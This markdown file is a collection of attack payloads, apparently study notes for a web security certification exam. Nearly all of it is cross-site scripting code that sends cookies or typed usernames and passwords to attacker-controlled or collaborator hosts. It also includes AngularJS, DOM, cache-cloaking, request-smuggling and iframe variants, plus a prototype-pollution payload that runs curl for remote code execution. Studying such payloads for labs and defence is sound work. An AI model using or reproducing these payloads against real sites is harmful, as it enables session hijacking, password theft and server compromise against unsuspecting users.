Steal cookies collaborator:

```javascript
<script>
fetch(`https://burpcollaborator.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>
```

Steal Cookies Exploit Server:

```javascript
<script>
fetch(`https://collaborator.net/x`+document.cookie);
</script>
```

XSS Cookie Stealer payloads using JavaScript:

```javascript
JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie
```

Reflected XSS into HTML context with nothing encoded in search:

```javascript
<script>document.location='https://COLLABORATOR.com?c='+document.cookie</script>
```

Reflected DOM XSS, into JSON data that is processed by **eval().**

```javascript
\"-fetch('https://Collaborator.com?cs='+btoa(document.cookie))}//
```

JavaScript Template literals are enclosed by backtick ( ` ) characters instead of double or single quotes:

```javascript
${document.location='https://tvsw9dim0doynnpscx9mgtq67xdo1jp8.oastify.com/?cookies='+document.cookie;}
```

AngularJS DOM XSS Attack **constructor** payloads:

```javascript
{{$on.constructor('alert(1)')()}}
```

```javascript
{{$on.constructor('document.location="https://COLLABORATOR.com?c="+document.cookie')()}}
```

HTTP request smuggling to deliver reflected XSS

```javascript
a"/><script>document.location='https://bc.oastify.com/cookiestealer.php?c='+document.cookie;</script>
```

Web Cache Parameter cloaking - script `/js/geolocate.js`, executing the callback function `setCountryCookie()`

```javascript
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=document.location='http://BURPCOL.oastify.com/?StealCookies=' document.cookie ;//
```

More Cross-Site Scripting (XSS) example cookie stealer payloads

```javascript
<script>
document.location='https://Collaborator.com/?cookiestealer='+document.cookie;
</script>
```

HTML [](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/payloads/CookieStealer-Payloads.md) Tag, with invalid Image source, with escape sequence from source code calling `window.location` for the **LastViewedProduct``` cookie.

```javascript
&'><img src=1 onerror=print()>
&'><img src=x onerror=this.src="https://exploit-0a6b000b033762e6c0fa121d01fc0020.exploit-server.net/?ex="+document.cookie>
<img src=x onerror=this.src=https://exploit.net/?'+document.cookie;>
```

_**Document.location**_ returns a Location object, which contains information about the URL of the document and provides methods for changing that URL and loading another URL.

```javascript
document.location='https://burp-collab.x.com/cookiestealer.php?c='+document.cookie;
```

```javascript
document.location='https://BurpCollaBoRaTor.oastify.com/?FreeCookies='+document.cookie;
```

DocumentWrite
```javascript
/?evil='/><script>document.write('<img src="https://exploit.com/steal.MY?cookie=' document.cookie '" />')</script>
```

```javascript
<script>
    document.location=""http://stock.lab.web-security-academy.net/?productId=4
            <script>
                    var req = new XMLHttpRequest(); 
                    req.onload = reqListener; 
                    req.open('get','https://lab.web-security-academy.net/accountDetails',true); 
                    req.withCredentials = true;
                    req.send();
                    function reqListener() {
                            location='https://exploit.web-security-academy.net/log?key='%2bthis.responseText;
                    };
            %3c/script>
            &storeId=1""
</script>
```

```javascript
<script>
fetch(‘https://burpcollaborator.net’, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});
</script>
```

```javascript
<script>
  fetch('https://COLLABORATOR.com', {
  method: 'POST',
  mode: 'no-cors',
  body:'PeanutButterCookies='+document.cookie
  }); 
</script>   
```

```javascript
x"); var fuzzer=new Image;fuzzer.src="https://COLLABORATOR.com/?"+document.cookie; //
```

```javascript
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>  
```

> OSCP Offsec PWK hand book cookie stealer example

```js
<script>new Image().src="http://Collaborator.COM/cool.jpg?output="+document.cookie;</script>
```

> Alt Cookie Stealer

```js
?productId=1&storeId="></select><img src=x onerror=this.src='http://exploit.bad/?'+document.cookie;>
```

```js
<script>
document.write('<img src="http://exploit.net?cookieStealer='+document.cookie+'" />');
</script>
```

```js
<script>
fetch('https://BURP-COLLABORATOR', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

> :::: Steal Password / Cookie Stealer ::::

> XMLHttpRequest

```html
<input name=username id=username>
<input type=password name=password id=password onhcange="CaptureFunction()">
<script>
function CaptureFunction()
{
var user = document.getElementById('username').value;
var pass = document.getElementById('password').value;
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://exploit.com/?username=" + user + "&password=" + pass, true);
xhr.send();
}
</script>
```

> FETCH API

```js
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

> :::: DATA EXFILTRATION / COOKIE STEALER ::::

```js
  </textarea><script>fetch('http://exploit.evil?cookie=' + btoa(document.cookie) );</script> 
```

```js
<script>document.write('<img src="http://evil.net/submitcookie.php?cookie=' + escape(document.cookie) + '" />');</script>
```

```js
<script>
document.write('<img src="HTTPS://EXPLOIT.net/?c='+document.cookie+'" />');
</script>
```

```js
<script>document.write('<img src="https://EXPLOIT.net/?c='%2bdocument.cookie%2b'" />');</script>
```

> IFRAMEs

```js
<iframe src=https://TARGET.net/ onload='this.contentWindow.postMessage(JSON.stringify({
    "type": "load-channel",
    "url": "JavaScript:document.location='https://COLLABORATOR.com?c='+document.cookie"
}), "*");'>
```

> IFRAME + Load-Channel + fetch

```js
<iframe src="https://TARGET.net/"
        onload='this.contentWindow.postMessage(
          JSON.stringify({
            type: "load-channel",
            url: "javascript:fetch(`https://COLLABORATOR.com/?poc=`+encodeURIComponent(document.cookie))"
          }), "*")'>
</iframe>
```

> Javascript set test cookie in current browser session with no HttpOnly flag to allow proof of concept cookie stealer.

```
document.cookie = "TopSecretCookie=HackThePlanetWithPeanutButter";
```

> Prompt Validation payload, does not steal cookie or send it to exploit server.

```html
<img src=x onerror=prompt(1)>
```

> Remote code execution via server-side prototype pollution

```javascript
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
```